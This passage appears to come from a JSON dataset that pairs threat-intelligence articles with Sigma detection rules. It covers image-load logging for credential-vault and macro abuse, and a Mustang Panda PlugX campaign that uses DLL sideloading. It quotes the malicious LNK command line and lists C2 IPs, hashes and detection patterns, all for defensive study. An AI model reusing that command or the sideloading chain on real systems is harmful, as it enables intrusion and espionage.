VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "VBA DLL Loaded Via Office Application",
      "id": "e6ce8457-68b1-485b-9bdd-3c2b5d679aa9",
      "status": "test",
      "description": "Detects VB DLL's loaded by an office application. Which could indicate the presence of VBA Macros.",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-02-10",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|endswith": [
            "\\VBE7.DLL",
            "\\VBEUI.DLL",
            "\\VBE7INTL.DLL"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate macro usage. Add the appropriate filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_vbadll_load.yml",
    "id": "21"
  },
  {
    "url": "https://web.archive.org/web/20250203175446/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets",
    "markdown": "# Mustang Panda Uses the Russian-Ukrainian War to Attack Europe and Asia Pacific Targets\n\n**Category:** CYBERSECURITY\n**Date:** 12.06.22\n\n*Mustang Panda* continues targeting countries across Europe and Asia Pacific, utilizing current geopolitical events to their advantage. Their attack chain remains consistent, with the continued use of archive files, shortcut files, malicious loaders, and the use of PlugX malware. Based on the lure covered in this blog, the goal of this particular operation appears to be collecting sensitive information from European countries and states from Asia, which might be supporting Western countries.\n\n### Summary\n\nAs part of ongoing hunting and continuous monitoring efforts regarding the advanced persistent threat (APT) group Mustang Panda, the BlackBerry Threat Research and Intelligence team recently came across an interesting RAR file titled “*Political Guidance for the new EU approach towards Russia.rar*”.\n\nThis file captured our interest due to the ongoing geopolitical situation in Eastern Europe. An examination of its contents revealed a decoy document matching the naming convention of the RAR, along with additional components that are often seen as part of a typical PlugX infection chain.\n\nBy delving into the associated network infrastructure and pivoting off related network artifacts, additional files and infrastructure were uncovered. These conformed to similar Tactics, Techniques, and Procedures (TTPs) and appeared to be part of a larger campaign from this same threat actor targeting multiple entities, both Government and Private, in several industries and throughout many countries across the world. In this report, we document what we found.\n\n*You can read our previous post on Mustang Panda here.*\n\n### Weaponization and Technical Overview\n\n| **Weapons**                | DLL Loaders + encrypted .dat payloads                                                                                             |\n| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n| **Attack Vector**          | Current event-themed phishing lures                                                                                               |\n| **Network Infrastructure** | Web based command-and-control (C2)                                                                                                |\n| **Targets**                | Mining, Education, Telecoms, Financial, CDN Companies, Internet Service Providers, Internet Security Firms, Web Hosting Companies |\n\n### Technical Analysis\n\n**Context**\nMustang Panda, also known as HoneyMyte, Bronze President or Red Delta, is one of the more active APT groups in operation on the threat landscape today, with a wide variety of campaigns documented as far back as 2012. It is publicly attributed to China-based cyberespionage threat actors.\n\nIt is continually honing its capabilities, but its core approach remains consistent, with the use of themed lures related to current events. These contain decoy documents and legitimate applications that are susceptible to DLL search order hijacking.\n\nThis is exploited to coerce targets into executing a malicious loader to deliver a PlugX payload. The RAR archive – “*Political Guidance for the new EU approach towards Russia.rar*” – aligned with numerous TTPs related to Mustang Panda that have previously been documented by both BlackBerry and other vendors.\n\n### Mustang Panda Attack Vector\n\nA RAR file is an archive that contains one or more files compressed with RAR compression. As seen in recent campaigns, the use of archives is a common infection vector for Mustang Panda. The political theme of the RAR file is a tactic employed by the threat actor to coerce targets into opening the file. Once the archive is open, the victim will see a directory called “_” and a shortcut file named with the same politically themed lure.\n\nThe .LNK file uses a double file extension in an attempt to disguise the shortcut file as a document in the hope the target would open it, in the process executing the shortcut file. This utilization of double extensions has been used by Mustang Panda in the past as a way to convince users to execute the shortcut file.\n\nThe shortcut file contains a command that kicks off the initial execution of the attack chain:\n\n> “C:\\Windows\\System32\\cmd.exe /c \"_\\___\\_\\___\\______\\_____\\__\\test11.bpu||(forfiles /^P %USERPROFILE%\\ /S /^M \"Political Guidance for the new EU approach towards Russia.rar\" /C \"cmd /c (c:\\progra~1\\7-Zip\\7z x -y -aoa @path||c:\\progra~2\\7-Zip\\7z x -y -aoa @path”\n\n```image\nAlt: Phishing lure contents\nDescription: The image shows a Windows File Explorer interface displaying the contents of a folder named 'MP_Archive'. Inside this folder, there is a directory titled '_' and a file named 'Political Guidance for the new EU approach towards Russia.doc', which is highlighted as a shortcut. The file size is indicated as 3 KB, and the date modified is shown as 11/1/2022 at 12:15 AM. This visual representation serves to illustrate the deceptive file structure used by the Mustang Panda threat actor to lure victims into executing malicious files.\nTranscription: |\n  | **File Name**     | Political Guidance for the new EU approach towards Russia.doc |\n  | ----------------- | ------------------------------------------------------------- |\n  | **Type**          | Shortcut                                                      |\n  | **Size**          | 3 KB                                                          |\n  | **Date modified** | 11/1/2022 12:15 AM                                            |\n  | **Directory**     | MP_Archive                                                    |\n  | **Contents**      | _                                                             |\n```\n\nThe LNK file looks to execute “test11.bpu”, which is a legitimate portable executable (PE) file called “ClassicExplorerSettings.exe” belonging to Classic Shell, which is a freeware utility used to customize the look of the Windows® system.\n\n```image\nAlt: MZ file header\nDescription: The image is a screenshot from a hex editor displaying the contents of a file named 'test11.bpu'. It shows the hexadecimal representation of the file alongside its decoded text. The decoded text includes fragments indicating that it is not a DOS executable and may contain some binary data. The layout features offsets in hexadecimal format, making it clear that this is a technical analysis of the file structure, relevant to the context of malware analysis.\nTranscription: |\n  HxD - [__________\\MP_Archive\\_\\_\\_\\_\\test11.bpu]\n  File  Edit  Search  View  Analysis  Tools  Window  Help\n  \n  Offset (h)  00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n  00000000    4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00\n  00000010    B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00\n  00000020    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000030    00 00 00 00 00 00 00 00 00 00 00 00 E0 00 00 00\n  00000040    0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68\n  00000050    00 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F\n  00000060    74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20\n  00000070    6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00\n  \n  Decoded text\n  MZ........ÿ........@...............à...o..´.L!This program cannot be run in DOS mode....$...\n```\n\n| **Hashes (md5, sha-256)** | 7177ab83a40a4111eb0170a76e92142b <br> f70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15 |\n| ------------------------- | ------------------------------------------------------------------------------------------------------ |\n| **File Name**             | Political Guidance for the new EU approach towards Russia.rar                                          |\n| **File Size**             | 567144 bytes                                                                                           |\n| **Created**               | 2022-11-01 02:32                                                                                       |\n| **Last Modified**         | 1979-11-29 13:00                                                                                       |\n\n### Weaponization\n\nThe Mustang Panda attack chain is reliant on the DLL sideloading technique previously used in their campaign targeting Myanmar, where the threat actor plants both a legitimate executable and a payload alongside each other, a technique which is designed to take advantage of the search order of a program as soon as the legitimate application has been invoked. Once the shortcut file is executed, the legitimate application will be launched and the malicious DLL loader will also get invoked.\n\n“ClassicExplorer32.dll” is planted in the same directory as “test11.bpu” to abuse the search order once the executable is invoked. The purpose of the DLL is to load the “ClassicExplorerLog.dat” file and execute the shellcode within it. Interestingly, the loader used seems to have a subtle change in how the shellcode is decrypted and executed.\n\nMustang Panda DLL loaders reported by Secureworks back in September were utilizing the *EnumThreadWindows* API to pass execution to the start of the malicious payload file. In these more recent samples, the DLL loader uses the *EnumSystemCodePagesW* API to execute the shellcode similarly. A pointer to the already decrypted shellcode is passed to *EnumSystemCodePagesW* API as an application-defined callback function, as seen in Figure 3 below. The purpose of the shellcode is to decrypt and execute the final malicious payload – PlugX – in memory.\n\n```image\nAlt: DLL Loader utilizing EnumSystemCodePagesW to load and execute shellcode\nDescription: The image depicts a detailed analysis of the DLL loader process utilized by the Mustang Panda threat actor. The upper half shows a disassembly of the 'ClassicExplorer32.dll' file, highlighting the use of the 'EnumSystemCodePagesW' API to execute shellcode. The highlighted sections in the code indicate critical parts of the execution flow. The lower half presents a hex dump of the 'ClassicExplorerLog.dat' file, providing insight into its structure and the data it contains. The overall composition of the image serves as a technical illustration of the malware's operational mechanics.\nTranscription: |\n  1. Disassembly View:\n     - Shows assembly code from `classicexplorer32.dll`.\n     - Highlights the function call to `kernel32.EnumSystemCodePages` and subsequent instructions.\n     - Labels and references (`eax`, `ecx`, `esp`) are visible with values:\n       - `eax = 774531E0` pointing to `EnumSystemCodePages`.\n  \n  2. Register View (Top Right):\n     - eax: Address of `kernel32.EnumSystemCodePages`.\n     - esp: Stack pointer showing memory addresses (e.g., `0168F020`).\n  \n  3. Memory Dump:**\n     - Highlighted address: `0168F020`.\n     - Displays raw hexadecimal data corresponding to stack memory.\n  \n  4. Hex Editor (Bottom Right):\n     - File opened: `ClassicExplorerLog.dat`.\n     - The offset in the file corresponds to the dumped memory values.\n     - Displays decoded text and values in hex format alongside ASCII representation.\n```\n\n| **Hashes (md5, sha-256)** | ae105528a6c5758ccf18705a8c208a97 <br> b44cc792ae7f58e9a12a121c14a067ee1dd380df093339b4bf2b02df5937b2af |\n| ------------------------- | ------------------------------------------------------------------------------------------------------ |\n| **ITW File Name**         | ClassicExplorerSettings.exe                                                                            |\n| **Compilation Stamp**     | 2017-08-13 15:49:42 UTC                                                                                |\n| **File Type/Signature**   | PE32 executable for MS Windows (GUI) Intel 80386 32-bit                                                |\n| **File Size**             | 98616 bytes                                                                                            |\n\n| **Hashes (md5, sha-256)** | 6d6a0ca7c7343eedfffeb697229a4929 <br> 8e27900949a087349488d82e7434937bd253d31749041bb0233000a7339fc3e1 |\n| ------------------------- | ------------------------------------------------------------------------------------------------------ |\n| **ITW File Name**         | ClassicExplorer32.dll                                                                                  |\n| **Compilation Stamp**     | 2022-10-25 09:32:51 UTC                                                                                |\n| **File Type/Signature**   | PE32 executable for MS Windows (DLL) (GUI) Intel 80386 32-bit                                          |\n| **File Size**             | 115000 bytes                                                                                           |\n\n| **Hashes (md5, sha-256)** | a95f48acd5da4beddd4115e12653c23c <br> 9c1ea202237726984b754d17528cfab0212ff9587bbffaf01c8535277b01c24a |\n| ------------------------- | ------------------------------------------------------------------------------------------------------ |\n| **ITW File Name**         | ClassicExplorerLog.bin, ClassicExplorerLog.dat                                                         |\n| **File Type/Signature**   | DATA File                                                                                              |\n| **File Size**             | 614718 bytes                                                                                           |\n\nOnce the PlugX payload has been decrypted and execution is passed to the payload, we can see the config also get decrypted into memory. Here we can see the IP address 5[.]34[.]178[.]156, the campaign ID of “test222”, as well as the name of the decoy document that gets displayed to the victim.\n\n```image\nAlt: PlugX config C2\nDescription: The image displays a hex dump of binary data, showing memory addresses and corresponding hexadecimal values in a structured format. Specific sequences in the dump appear to represent an IP address (5.34.178.156) in a readable format among other data, which is related to the operations of the Mustang Panda attack chain as described in the context. This representation is crucial for analyzing the decrypted configuration details of the PlugX malware.\nTranscription: |\n  | 10097088 | 00 00 00 01 BB 35 2E 33 34 |\n  | 10097098 | 00 00 00 00 00 00 00 00 |\n  | 100970A8 | 00 00 00 00 00 00 00 00 |\n  | 100970B8 | 00 00 00 00 00 00 00 00 |\n  | 100970C8 | 00 00 00 00 00 00 00 00 |\n  | 100970D8 | 2E 31 37 38 2E 31 36 36 |\n  | 100970E8 | 00 00 00 00 00 00 00 00 |\n  | 100970F8 | 00 00 00 00 00 00 00 00 |\n  | 10097108 | 35 33 2E 31 37 38 00 00 |\n  | 10097118 | 35 2E 33 34 2E 31 37 38 |\n  | 10097128 | 00 00 00 00 00 00 00 00 |\n```\n\n```image\nAlt: PlugX campaign ID + decoy document name\nDescription: The image displays a hexadecimal dump of binary data, featuring both the hexadecimal values on the left and their corresponding ASCII interpretations on the right. Key sections are highlighted in purple, indicating significant strings, which include terms like 'Political Guidance' and 'New EU Approach Towards Russia.' This dump is likely part of a binary analysis related to a malware payload, illustrating data relevant to the ongoing discussion of the Mustang Panda operation.\nTranscription: |\n  10096DF8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . . . .\n  10096E08  73 00 74 00 32 00 32 00 00 00 00 00 00 00 00 00  s . t . 2 . 2 . . . . . . . . .\n  10096E18  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . .\n  10096E28  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . .\n  10096E38  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . .\n  10096E48  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . .\n  10096E58  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  . . . . . . . . . . . . . . .\n  10096E68  6c 00 69 00 74 00 69 00 63 00 61 00 6c 00 00 00 00  l . i . t . i . c . a . l . . .\n  10096E78  47 00 75 00 69 00 64 00 61 00 6e 00 63 00 65 00 00  G . u . i . d . a . n . c . e . . .\n  10096E88  66 00 6f 00 72 00 00 00 00 00 00 00 00 00 00 00  f . o . r . . . . . . . . . .\n  10096E98  74 00 68 00 65 00 00 00 00 00 00 00 00 00 00 00  t . h . e . . . . . . . . . .\n  10096EA8  6e 00 65 00 77 00 00 00 00 00 00 00 00 00 00 00  n . e . w . . . . . . . . . .\n  10096EB8  45 00 55 00 00 00 00 00 00 00 00 00 00 00 00 00  E . U . . . . . . . . . . . .\n  10096EC8  61 00 70 00 70 00 72 00 6f 00 61 00 63 00 68 00  . a . p . p . r . o . a . c . h . . .\n  10096ED8  74 00 6f 00 77 00 61 00 72 00 64 00 73 00 00 00  t . o . w . a . r . d . s . . .\n  10096EE8  52 00 75 00 73 00 73 00 69 00 61 00 00 00 00 00  R . u . s . s . i . a . . . .\n  10096EF8  64 00 6f 00 63 00 78 00 00 00 00 00 00 00 00 00  d . o . c . x . . . . . . .\n```\n\n### Network Infrastructure\n\nThe C2 IP address – 5[.]34[.]178[.]156 – was seen to be hosting a service on port 443 with a unique SSL certificate. The SSL certificate was first seen being associated with this IP from the period 2022-10-07 to 2022-10-30.\n\n| **Domain Name**    | **Samples’ Hashes**                                                                                    | **First/Last Seen/ASN**                    |\n| ------------------ | ------------------------------------------------------------------------------------------------------ | ------------------------------------------ |\n| 5[.]34[.]178[.]156 | a95f48acd5da4beddd4115e12653c23c <br> 9c1ea202237726984b754d17528cfab0212ff9587bbffaf01c8535277b01c24a | 2022-07-19 <br> 2022-10-31 <br> ASN:204957 |\n\n| **Certificate**                                                                                                                                                                                                                          |\n| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| CN=45.134.83.29,OU=TLS Demo Cert,O=File Transfer Service, 2.5.4.46= #13186d67332f6d4c506d4b335966582f4d614a43732f6d673d3d <br> Issuer - CN=CTA Root CA, O=TEST TEST TEST, 2.5.4.46=#13185843794c4248705065757479714b4344383866614e773d3d |\n\n### Additional Linked Infrastructure\n\nPivoting on the certificate showed 15 other IP addresses utilizing the same SSL certificate. Five of these were being used as C2 servers for the same attack chain delivering lures/decoys in the form of RAR files, in the hopes of the victims executing PlugX malware in memory.\n\nThe lures all varied but all aligned with the previous campaigns associated with Mustang Panda.\n\n### Targets\n\nMustang Panda’s previous targets have included Government and Non-Government Organizations (NGO) in many locations around the world, from various states in Southeast Asia, to the European Union, to the U.S. and beyond. Considering the decoy lures found, as well as the correlating network telemetry, we found the threat actor to be targeting areas in Europe as well as Asia-Pacific, specifically Vietnam. This is not an exhaustive list as we have been unable to identify the industries of all the victims thus far.\n\n```image\nAlt: Partial list of victims\nDescription: The image is a world map showing various countries highlighted in red. These countries represent the targets of the threat actor known as Mustang Panda, specifically indicating regions in Europe and Asia-Pacific, including Vietnam. The map is presented on a dark gray background, with the highlighted areas providing a visual representation of the geographical reach of the cyber attacks.\n```\n\n### Conclusions\n\nMustang Panda continues to utilize well-thought-out lures related to current events to deliver the PlugX malware that the group is synonymous with. While Mustang Panda has stayed within their typical TTPs with PlugX, including custom lures, double extensions, and infrastructure re-use, they do make subtle changes along the way in the hope of evading detection. The historical data associated with the pivoted SSL certificate shows it being first seen on 2022-02-27. It is still being actively used at the time of writing.\n\nMustang Panda has a history of targeting many different entities across the globe, but their target aligns with the interests of the Chinese government. From the associated lures, NetFlow data, and other characteristics, the EU and APAC have been their biggest targets as of late.\n\n*For similar articles and news delivered straight to your inbox, subscribe to the BlackBerry blog.*\n\n### Referential Indicators of Compromise (IoCs)\n\n**Main File**\n\n| **File Name**              | Political Guidance for the new EU approach towards Russia.rar    |\n| -------------------------- | ---------------------------------------------------------------- |\n| **SHA256**                 | F70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15 |\n| **File Type**              | RAR                                                              |\n| **Network Indicator (C2)** | 5[.]34.178.156                                                   |\n\n**Network Indicators**\n\n| **C2**           |\n| ---------------- |\n| 104[.]42.43.178  |\n| 64[.]34.216.50   |\n| 45[.]147.26.45   |\n| 45[.]32.101.7    |\n| 64[.]34.216.44   |\n| 185[.]80.201.4   |\n| 103[.]192.226.87 |\n| 194[.]124.227.90 |\n| 43[.]254.218.128 |\n| 62[.]233.57.49   |\n\n### Detailed MITRE ATT&CK® Mapping\n\n| **Tactic**                       | **Technique** | **Sub-Technique name**                  |\n| -------------------------------- | ------------- | --------------------------------------- |\n| Execution                        | T1203         | Exploitation for Client Execution       |\n| Execution                        | T1106         | Native API                              |\n| Execution                        | T1129         | Shared Module                           |\n| Execution                        | T1559.001     | Component Object Model                  |\n| Execution                        | T1204.002     | Malicious File                          |\n| Execution                        | T1059.003     | Windows Command Shell                   |\n| Persistence/Privilege Escalation | T1547.001     | Registry Run Keys / Startup Folder      |\n| Defense Evasion                  | T1574.002     | DLL Side-Loading                        |\n| Defense Evasion                  | T1027         | Obfuscated Files or Information         |\n| Defense Evasion                  | T1036         | Masquerading                            |\n| Defense Evasion                  | T1036.007     | Double File Extension                   |\n| Defense Evasion                  | T1218         | System Binary Proxy Execution           |\n| Defense Evasion                  | T1564.001     | Hidden Files and Directories            |\n| Defense Evasion                  | T1140         | Deobfuscate Decode Files or Information |\n| Discovery                        | T1057         | Process Discovery                       |\n| Discovery                        | T1082         | System Information Discovery            |\n| Discovery                        | T1518         | Software Discovery                      |\n| Discovery                        | T1033         | System Owner/User Discovery             |\n| Collection                       | T1560.001     | Archive via Utility                     |\n| Persistence                      | T1547.009     | Shortcut                                |\n| Command and Control              | T1071.001     | Web Protocols                           |",
    "sigma_rule": {
      "title": "Potential DLL Sideloading Via ClassicExplorer32.dll",
      "id": "caa02837-f659-466f-bca6-48bde2826ab4",
      "status": "test",
      "description": "Detects potential DLL sideloading using ClassicExplorer32.dll from the Classic Shell software",
      "references": [
        "https://web.archive.org/web/20250203175446/https://blogs.blackberry.com/en/2022/12/mustang-panda-uses-the-russian-ukrainian-war-to-attack-europe-and-asia-pacific-targets",
        "https://any.run/report/f70d3601fb456a18ed7e7ed599d10783447016da78234f5dca61b8bd3a084a15/6d8cabb0-dcda-44b6-8050-28d6ce281687/"
      ],
      "author": "frack113",
      "date": "2022-12-13",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1574.001",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_classicexplorer": {
          "ImageLoaded|endswith": "\\ClassicExplorer32.dll"
        },
        "filter_classicexplorer": {
          "ImageLoaded|startswith": "C:\\Program Files\\Classic Shell\\"
        },
        "condition": "selection_classicexplorer and not filter_classicexplorer"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_side_load_classicexplorer32.yml",
    "id": "27"
  },
  {
